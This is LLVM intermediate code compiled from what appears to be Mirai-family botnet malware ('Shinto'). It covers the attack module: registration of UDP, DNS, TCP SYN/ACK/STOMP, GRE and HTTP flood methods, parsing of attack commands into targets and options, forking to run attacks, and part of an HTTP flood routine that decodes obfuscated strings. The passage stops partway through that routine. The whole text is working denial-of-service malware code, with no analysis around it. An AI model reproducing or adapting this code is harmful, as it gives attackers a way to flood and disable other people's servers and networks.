; ModuleID = 'host/ir_O2/Shinto.d.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.table_value = type { i8*, i16 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.attack_http_state = type { i32, i8, i32, i32, i32, [512 x i8], [257 x i8], [129 x i8], [513 x i8], [9 x i8], [9 x i8], i32, i32, i32, i32, i32, [5 x [128 x i8]], i32, [1024 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }

@methods_len = local_unnamed_addr global i8 0, align 1
@methods = local_unnamed_addr global %struct.attack_method** null, align 8
@attack_ongoing = local_unnamed_addr global [8 x i32] zeroinitializer, align 16
@LOCAL_ADDR = common local_unnamed_addr global i32 0, align 4
@.str = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"\0D\0AHost: \00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"Cookie: \00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"; \00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c"url=\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.13 = private unnamed_addr constant [2 x i8] c"'\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@table = common local_unnamed_addr global [63 x %struct.table_value] zeroinitializer, align 16
@table_key = local_unnamed_addr global i32 1043935, align 4

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() local_unnamed_addr #0 {
  tail call fastcc void @add_attack(i8 zeroext 0, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_udp_generic)
  tail call fastcc void @add_attack(i8 zeroext 1, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_udp_vse)
  tail call fastcc void @add_attack(i8 zeroext 2, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_udp_dns)
  tail call fastcc void @add_attack(i8 zeroext 8, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_udp_plain)
  tail call fastcc void @add_attack(i8 zeroext 3, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_tcp_syn)
  tail call fastcc void @add_attack(i8 zeroext 4, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_tcp_ack)
  tail call fastcc void @add_attack(i8 zeroext 5, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_tcp_stomp)
  tail call fastcc void @add_attack(i8 zeroext 6, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_gre_ip)
  tail call fastcc void @add_attack(i8 zeroext 7, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_gre_eth)
  tail call fastcc void @add_attack(i8 zeroext 9, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* bitcast (void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_app_http to void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*))
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @add_attack(i8 zeroext, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*) unnamed_addr #0 {
  %3 = tail call noalias i8* @calloc(i64 1, i64 16) #10
  %4 = getelementptr inbounds i8, i8* %3, i64 8
  store i8 %0, i8* %4, align 8
  %5 = bitcast i8* %3 to void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)**
  store void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %5, align 8
  %6 = load i8*, i8** bitcast (%struct.attack_method*** @methods to i8**), align 8
  %7 = load i8, i8* @methods_len, align 1
  %8 = zext i8 %7 to i64
  %9 = shl nuw nsw i64 %8, 3
  %10 = add nuw nsw i64 %9, 8
  %11 = tail call i8* @realloc(i8* %6, i64 %10) #10
  %12 = bitcast i8* %11 to %struct.attack_method**
  store i8* %11, i8** bitcast (%struct.attack_method*** @methods to i8**), align 8
  %13 = load i8, i8* @methods_len, align 1
  %14 = add i8 %13, 1
  store i8 %14, i8* @methods_len, align 1
  %15 = zext i8 %13 to i64
  %16 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %12, i64 %15
  %17 = bitcast %struct.attack_method** %16 to i8**
  store i8* %3, i8** %17, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) local_unnamed_addr #1

; Function Attrs: nounwind
declare noalias i8* @realloc(i8* nocapture, i64) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) local_unnamed_addr #0 {
  %3 = icmp ult i32 %1, 4
  br i1 %3, label %.thread80, label %4

; <label>:4:                                      ; preds = %2
  %5 = bitcast i8* %0 to i32*
  %6 = load i32, i32* %5, align 4
  %7 = tail call i32 @ntohl(i32 %6) #11
  %8 = icmp eq i32 %1, 4
  br i1 %8, label %.thread80, label %9

; <label>:9:                                      ; preds = %4
  %10 = getelementptr inbounds i8, i8* %0, i64 4
  %11 = load i8, i8* %10, align 1
  %12 = icmp eq i32 %1, 5
  br i1 %12, label %.thread80, label %13

; <label>:13:                                     ; preds = %9
  %14 = getelementptr inbounds i8, i8* %0, i64 5
  %15 = getelementptr inbounds i8, i8* %0, i64 6
  %16 = load i8, i8* %14, align 1
  %17 = add i32 %1, -6
  %18 = zext i8 %16 to i32
  %19 = icmp eq i8 %16, 0
  br i1 %19, label %.thread80, label %20

; <label>:20:                                     ; preds = %13
  %21 = sext i32 %17 to i64
  %22 = zext i8 %16 to i64
  %23 = mul nuw nsw i64 %22, 5
  %24 = icmp ult i64 %21, %23
  br i1 %24, label %.thread80, label %.lr.ph88.preheader

.lr.ph88.preheader:                               ; preds = %20
  %25 = tail call noalias i8* @calloc(i64 %22, i64 24) #10
  %26 = bitcast i8* %25 to %struct.attack_target*
  %27 = add nsw i32 %18, -1
  %28 = zext i32 %27 to i64
  %29 = mul nuw nsw i64 %28, 5
  %30 = add nuw nsw i64 %29, 11
  %scevgep = getelementptr i8, i8* %0, i64 %30
  %wide.trip.count = zext i8 %16 to i64
  %xtraiter = and i64 %wide.trip.count, 1
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph88.prol.loopexit, label %.lr.ph88.prol.preheader

.lr.ph88.prol.preheader:                          ; preds = %.lr.ph88.preheader
  br label %.lr.ph88.prol

.lr.ph88.prol:                                    ; preds = %.lr.ph88.prol.preheader
  %31 = bitcast i8* %15 to i32*
  %32 = load i32, i32* %31, align 4
  %33 = getelementptr inbounds i8, i8* %25, i64 16
  %34 = bitcast i8* %33 to i32*
  store i32 %32, i32* %34, align 4
  %35 = getelementptr inbounds i8, i8* %0, i64 10
  %36 = getelementptr inbounds i8, i8* %0, i64 11
  %37 = load i8, i8* %35, align 1
  %38 = getelementptr inbounds i8, i8* %25, i64 20
  store i8 %37, i8* %38, align 4
  %39 = bitcast i8* %25 to i16*
  store i16 2, i16* %39, align 4
  %40 = getelementptr inbounds i8, i8* %25, i64 4
  %41 = bitcast i8* %40 to i32*
  store i32 %32, i32* %41, align 4
  br label %.lr.ph88.prol.loopexit

.lr.ph88.prol.loopexit:                           ; preds = %.lr.ph88.preheader, %.lr.ph88.prol
  %indvars.iv91.unr = phi i64 [ 0, %.lr.ph88.preheader ], [ 1, %.lr.ph88.prol ]
  %.087.unr = phi i8* [ %15, %.lr.ph88.preheader ], [ %36, %.lr.ph88.prol ]
  %42 = icmp eq i8 %16, 1
  br i1 %42, label %._crit_edge, label %.lr.ph88.preheader.new

.lr.ph88.preheader.new:                           ; preds = %.lr.ph88.prol.loopexit
  br label %.lr.ph88

.lr.ph88:                                         ; preds = %.lr.ph88, %.lr.ph88.preheader.new
  %indvars.iv91 = phi i64 [ %indvars.iv91.unr, %.lr.ph88.preheader.new ], [ %indvars.iv.next92.1, %.lr.ph88 ]
  %.087 = phi i8* [ %.087.unr, %.lr.ph88.preheader.new ], [ %56, %.lr.ph88 ]
  %43 = bitcast i8* %.087 to i32*
  %44 = load i32, i32* %43, align 4
  %45 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 1
  store i32 %44, i32* %45, align 4
  %46 = getelementptr inbounds i8, i8* %.087, i64 4
  %47 = getelementptr inbounds i8, i8* %.087, i64 5
  %48 = load i8, i8* %46, align 1
  %49 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 2
  store i8 %48, i8* %49, align 4
  %50 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 0, i32 0
  store i16 2, i16* %50, align 4
  %51 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 0, i32 2, i32 0
  store i32 %44, i32* %51, align 4
  %indvars.iv.next92 = add nuw nsw i64 %indvars.iv91, 1
  %52 = bitcast i8* %47 to i32*
  %53 = load i32, i32* %52, align 4
  %54 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 1
  store i32 %53, i32* %54, align 4
  %55 = getelementptr inbounds i8, i8* %.087, i64 9
  %56 = getelementptr inbounds i8, i8* %.087, i64 10
  %57 = load i8, i8* %55, align 1
  %58 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 2
  store i8 %57, i8* %58, align 4
  %59 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 0, i32 0
  store i16 2, i16* %59, align 4
  %60 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 0, i32 2, i32 0
  store i32 %53, i32* %60, align 4
  %indvars.iv.next92.1 = add nsw i64 %indvars.iv91, 2
  %exitcond.1 = icmp eq i64 %indvars.iv.next92.1, %wide.trip.count
  br i1 %exitcond.1, label %._crit_edge.unr-lcssa, label %.lr.ph88

._crit_edge.unr-lcssa:                            ; preds = %.lr.ph88
  br label %._crit_edge

._crit_edge:                                      ; preds = %.lr.ph88.prol.loopexit, %._crit_edge.unr-lcssa
  %61 = mul nsw i32 %18, -5
  %62 = add i32 %17, %61
  %63 = icmp eq i32 %62, 0
  br i1 %63, label %.loopexit81.thread, label %64

; <label>:64:                                     ; preds = %._crit_edge
  %65 = load i8, i8* %scevgep, align 1
  %66 = icmp eq i8 %65, 0
  br i1 %66, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %64
  %67 = zext i8 %65 to i64
  %68 = tail call noalias i8* @calloc(i64 %67, i64 16) #10
  %69 = bitcast i8* %68 to %struct.attack_option*
  %70 = getelementptr inbounds i8, i8* %scevgep, i64 1
  %71 = add i32 %62, -1
  %72 = zext i8 %65 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %85
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %85 ]
  %.184 = phi i8* [ %70, %.lr.ph.preheader ], [ %91, %85 ]
  %.17583 = phi i32 [ %71, %.lr.ph.preheader ], [ %92, %85 ]
  %73 = icmp eq i32 %.17583, 0
  br i1 %73, label %.loopexit81.loopexit, label %74

; <label>:74:                                     ; preds = %.lr.ph
  %75 = load i8, i8* %.184, align 1
  %76 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %69, i64 %indvars.iv, i32 1
  store i8 %75, i8* %76, align 8
  %77 = icmp eq i32 %.17583, 1
  br i1 %77, label %.loopexit81.loopexit, label %78

; <label>:78:                                     ; preds = %74
  %79 = getelementptr inbounds i8, i8* %.184, i64 1
  %80 = getelementptr inbounds i8, i8* %.184, i64 2
  %81 = load i8, i8* %79, align 1
  %82 = add i32 %.17583, -2
  %83 = zext i8 %81 to i32
  %84 = icmp slt i32 %82, %83
  br i1 %84, label %.loopexit81.loopexit, label %85

; <label>:85:                                     ; preds = %78
  %86 = add nuw nsw i32 %83, 1
  %87 = zext i32 %86 to i64
  %88 = tail call noalias i8* @calloc(i64 %87, i64 1) #10
  %89 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %69, i64 %indvars.iv, i32 0
  store i8* %88, i8** %89, align 8
  tail call void @util_memcpy(i8* %88, i8* %80, i32 %83) #10
  %90 = zext i8 %81 to i64
  %91 = getelementptr inbounds i8, i8* %80, i64 %90
  %92 = sub nsw i32 %82, %83
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %93 = icmp slt i64 %indvars.iv.next, %72
  br i1 %93, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %85
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %64
  %.070 = phi %struct.attack_option* [ null, %64 ], [ %69, %.loopexit.loopexit ]
  %94 = tail call i32* @__errno_location() #11
  store i32 0, i32* %94, align 4
  tail call void @attack_start(i32 %7, i8 zeroext %11, i8 zeroext %16, %struct.attack_target* %26, i8 zeroext %65, %struct.attack_option* %.070)
  br label %.loopexit81

.loopexit81.loopexit:                             ; preds = %.lr.ph, %74, %78
  br label %.loopexit81

.loopexit81:                                      ; preds = %.loopexit81.loopexit, %.loopexit
  %.171 = phi %struct.attack_option* [ %.070, %.loopexit ], [ %69, %.loopexit81.loopexit ]
  %95 = icmp eq i8* %25, null
  br i1 %95, label %96, label %.loopexit81.thread

.loopexit81.thread:                               ; preds = %._crit_edge, %.loopexit81
  %.17195 = phi %struct.attack_option* [ %.171, %.loopexit81 ], [ null, %._crit_edge ]
  %.07393 = phi i8 [ %65, %.loopexit81 ], [ undef, %._crit_edge ]
  tail call void @free(i8* nonnull %25) #10
  br label %96

; <label>:96:                                     ; preds = %.loopexit81, %.loopexit81.thread
  %.17196 = phi %struct.attack_option* [ %.171, %.loopexit81 ], [ %.17195, %.loopexit81.thread ]
  %.07394 = phi i8 [ %65, %.loopexit81 ], [ %.07393, %.loopexit81.thread ]
  %97 = icmp eq %struct.attack_option* %.17196, null
  br i1 %97, label %.thread80, label %98

; <label>:98:                                     ; preds = %96
  %99 = zext i8 %.07394 to i32
  tail call fastcc void @free_opts(%struct.attack_option* nonnull %.17196, i32 %99)
  br label %.thread80

.thread80:                                        ; preds = %2, %4, %9, %13, %20, %96, %98
  ret void
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #2

declare void @util_memcpy(i8*, i8*, i32) local_unnamed_addr #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) local_unnamed_addr #0 {
  %7 = tail call i32 @fork() #10
  %8 = icmp sgt i32 %7, 0
  %9 = icmp eq i32 %7, -1
  %or.cond = or i1 %8, %9
  br i1 %or.cond, label %14, label %.preheader

.preheader:                                       ; preds = %6
  %10 = load i8, i8* @methods_len, align 1
  %11 = icmp eq i8 %10, 0
  br i1 %11, label %.loopexit, label %.lr.ph

.lr.ph:                                           ; preds = %.preheader
  %12 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %13 = zext i8 %10 to i64
  br label %17

; <label>:14:                                     ; preds = %6
  ret void

; <label>:15:                                     ; preds = %17
  %16 = icmp slt i64 %indvars.iv.next, %13
  br i1 %16, label %17, label %.loopexit.loopexit

; <label>:17:                                     ; preds = %.lr.ph, %15
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %15 ]
  %18 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %12, i64 %indvars.iv
  %19 = load %struct.attack_method*, %struct.attack_method** %18, align 8
  %20 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %19, i64 0, i32 1
  %21 = load i8, i8* %20, align 8
  %22 = icmp eq i8 %21, %1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  br i1 %22, label %23, label %15

; <label>:23:                                     ; preds = %17
  %24 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %19, i64 0, i32 0
  %25 = load void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %24, align 8
  tail call void %25(i32 %0, i8 zeroext %2, %struct.attack_target* %3, i8 zeroext %4, %struct.attack_option* %5) #10
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %15
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %23
  tail call void @exit(i32 0) #12
  unreachable
}

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @free_opts(%struct.attack_option*, i32) unnamed_addr #0 {
  %3 = icmp eq %struct.attack_option* %0, null
  br i1 %3, label %11, label %.preheader

.preheader:                                       ; preds = %2
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %9
  %indvars.iv = phi i64 [ %indvars.iv.next, %9 ], [ 0, %.lr.ph.preheader ]
  %5 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %0, i64 %indvars.iv, i32 0
  %6 = load i8*, i8** %5, align 8
  %7 = icmp eq i8* %6, null
  br i1 %7, label %9, label %8

; <label>:8:                                      ; preds = %.lr.ph
  tail call void @free(i8* nonnull %6) #10
  br label %9

; <label>:9:                                      ; preds = %.lr.ph, %8
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %9
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %10 = bitcast %struct.attack_option* %0 to i8*
  tail call void @free(i8* %10) #10
  br label %11

; <label>:11:                                     ; preds = %2, %._crit_edge
  ret void
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #4

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i8* readnone) local_unnamed_addr #5 {
  %5 = icmp eq i8 %0, 0
  br i1 %5, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %4
  %6 = zext i8 %0 to i64
  br label %.lr.ph

; <label>:7:                                      ; preds = %.lr.ph
  %8 = icmp slt i64 %indvars.iv.next, %6
  br i1 %8, label %.lr.ph, label %.loopexit.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %7
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %7 ]
  %9 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %1, i64 %indvars.iv, i32 1
  %10 = load i8, i8* %9, align 8
  %11 = icmp eq i8 %10, %2
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  br i1 %11, label %12, label %7

; <label>:12:                                     ; preds = %.lr.ph
  %13 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %1, i64 %indvars.iv, i32 0
  %14 = load i8*, i8** %13, align 8
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %7
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %4, %12
  %.09 = phi i8* [ %14, %12 ], [ %3, %4 ], [ %3, %.loopexit.loopexit ]
  ret i8* %.09
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i32) local_unnamed_addr #0 {
  %5 = tail call i8* @attack_get_opt_str(i8 zeroext %0, %struct.attack_option* %1, i8 zeroext %2, i8* null)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %4
  %8 = tail call i32 @util_atoi(i8* nonnull %5, i32 10) #10
  br label %9

; <label>:9:                                      ; preds = %4, %7
  %.0 = phi i32 [ %8, %7 ], [ %3, %4 ]
  ret i32 %.0
}

declare i32 @util_atoi(i8*, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i32) local_unnamed_addr #0 {
  %5 = tail call i8* @attack_get_opt_str(i8 zeroext %0, %struct.attack_option* %1, i8 zeroext %2, i8* null)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %4
  %8 = tail call i32 @inet_addr(i8* nonnull %5) #10
  br label %9

; <label>:9:                                      ; preds = %4, %7
  %.0 = phi i32 [ %8, %7 ], [ %3, %4 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_app_http(i8 zeroext, %struct.attack_target* nocapture readonly, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca [10241 x i8], align 16
  %7 = alloca %struct.fd_set, align 8
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca <2 x i64>, align 16
  %tmpcast = bitcast <2 x i64>* %9 to %struct.timeval*
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca [10240 x i8], align 16
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 20, i8* null)
  %15 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 19, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0))
  %16 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 8, i8* null)
  %17 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 21, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 23, i32 1)
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 80)
  %20 = trunc i32 %19 to i16
  %21 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %21, i8 0, i64 10241, i32 16, i1 false)
  %22 = icmp eq i8* %16, null
  %23 = icmp eq i8* %17, null
  %or.cond = or i1 %22, %23
  br i1 %or.cond, label %1018, label %24

; <label>:24:                                     ; preds = %4
  %25 = tail call i32 @util_strlen(i8* %17) #10
  %26 = icmp sgt i32 %25, 255
  br i1 %26, label %1018, label %27

; <label>:27:                                     ; preds = %24
  %28 = tail call i32 @util_strlen(i8* %16) #10
  %29 = icmp sgt i32 %28, 127
  br i1 %29, label %1018, label %30

; <label>:30:                                     ; preds = %27
  %31 = tail call i32 @util_strlen(i8* %15) #10
  %32 = icmp sgt i32 %31, 9
  br i1 %32, label %1018, label %.preheader597

.preheader597:                                    ; preds = %30
  store i32 0, i32* %5, align 4
  %33 = tail call i32 @util_strlen(i8* %15) #10
  %34 = icmp sgt i32 %33, 0
  br i1 %34, label %.lr.ph637.preheader, label %._crit_edge638

.lr.ph637.preheader:                              ; preds = %.preheader597
  br label %.lr.ph637

.lr.ph637:                                        ; preds = %.lr.ph637.preheader, %42
  %35 = phi i32 [ %44, %42 ], [ 0, %.lr.ph637.preheader ]
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %15, i64 %36
  %38 = load i8, i8* %37, align 1
  %.off586 = add i8 %38, -97
  %39 = icmp ult i8 %.off586, 26
  br i1 %39, label %40, label %42

; <label>:40:                                     ; preds = %.lr.ph637
  %41 = add i8 %38, -32
  store i8 %41, i8* %37, align 1
  %.pre = load i32, i32* %5, align 4
  br label %42

; <label>:42:                                     ; preds = %.lr.ph637, %40
  %43 = phi i32 [ %35, %.lr.ph637 ], [ %.pre, %40 ]
  %44 = add nsw i32 %43, 1
  store i32 %44, i32* %5, align 4
  %45 = tail call i32 @util_strlen(i8* nonnull %15) #10
  %46 = icmp slt i32 %44, %45
  br i1 %46, label %.lr.ph637, label %._crit_edge638.loopexit

._crit_edge638.loopexit:                          ; preds = %42
  br label %._crit_edge638

._crit_edge638:                                   ; preds = %._crit_edge638.loopexit, %.preheader597
  %47 = icmp slt i32 %18, 512
  %. = select i1 %47, i32 %18, i32 512
  tail call void @table_unlock_val(i8 zeroext 43)
  tail call void @table_unlock_val(i8 zeroext 44)
  tail call void @table_unlock_val(i8 zeroext 45)
  tail call void @table_unlock_val(i8 zeroext 46)
  tail call void @table_unlock_val(i8 zeroext 47)
  tail call void @table_unlock_val(i8 zeroext 48)
  tail call void @table_unlock_val(i8 zeroext 49)
  tail call void @table_unlock_val(i8 zeroext 50)
  tail call void @table_unlock_val(i8 zeroext 51)
  tail call void @table_unlock_val(i8 zeroext 52)
  tail call void @table_unlock_val(i8 zeroext 53)
  %48 = sext i32 %. to i64
  %49 = tail call noalias i8* @calloc(i64 %48, i64 3140) #10
  %50 = bitcast i8* %49 to %struct.attack_http_state*
  %51 = icmp sgt i32 %18, 0
  br i1 %51, label %.lr.ph636, label %.preheader595

.lr.ph636:                                        ; preds = %._crit_edge638
  %52 = zext i8 %0 to i32
  br label %64

.preheader595.loopexit:                           ; preds = %95
  br label %.preheader595

.preheader595:                                    ; preds = %.preheader595.loopexit, %._crit_edge638
  %53 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 0
  %54 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i64 0, i32 0, i64 0
  %55 = bitcast i32* %12 to i8*
  %56 = bitcast %struct.sockaddr_in* %10 to i8*
  %57 = bitcast i32* %5 to i8*
  %58 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i64 0, i32 0
  %59 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i64 0, i32 2, i32 0
  %60 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i64 0, i32 1
  %61 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %62 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 0
  %63 = icmp ne i8* %14, null
  %.not = icmp slt i32 %18, 1
  br label %.backedge596

; <label>:64:                                     ; preds = %.lr.ph636, %95
  %indvars.iv661 = phi i64 [ 0, %.lr.ph636 ], [ %indvars.iv.next662, %95 ]
  %65 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 1
  store i8 0, i8* %65, align 4
  %66 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 0
  store i32 -1, i32* %66, align 4
  %67 = trunc i64 %indvars.iv661 to i32
  %68 = srem i32 %67, %52
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %69, i32 1
  %71 = load i32, i32* %70, align 4
  %72 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 4
  store i32 %71, i32* %72, align 4
  %73 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 6, i64 0
  %74 = tail call i32 @util_strcpy(i8* %73, i8* %17) #10
  %75 = load i8, i8* %73, align 4
  %76 = icmp eq i8 %75, 47
  br i1 %76, label %81, label %77

; <label>:77:                                     ; preds = %64
  %78 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 6, i64 1
  %79 = tail call i32 @util_strlen(i8* %73) #10
  %80 = sext i32 %79 to i64
  tail call void @llvm.memmove.p0i8.p0i8.i64(i8* %78, i8* %73, i64 %80, i32 1, i1 false)
  store i8 47, i8* %73, align 4
  br label %81

; <label>:81:                                     ; preds = %64, %77
  %82 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 10, i64 0
  %83 = tail call i32 @util_strcpy(i8* %82, i8* %15) #10
